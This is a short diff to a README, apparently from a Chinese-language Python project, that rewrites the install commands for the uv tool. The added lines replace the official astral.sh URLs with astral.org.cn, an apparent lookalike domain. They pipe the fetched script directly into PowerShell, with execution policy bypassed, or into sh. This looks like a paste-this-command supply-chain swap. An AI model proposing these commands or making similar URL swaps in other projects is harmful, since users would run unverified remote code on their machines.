@@ -23,10 +23,10 @@
 
 ```bash
 # Windows (PowerShell)
-powershell -c "irm https://astral.sh/uv/install.ps1 | iex"
+powershell -ExecutionPolicy ByPass -c "irm https://astral.org.cn/uv/install.ps1 | iex"
 
 # macOS / Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
+curl -LsSf https://astral.org.cn/uv/install.sh | sh
 ```
 
 ### 2. 安装项目依赖
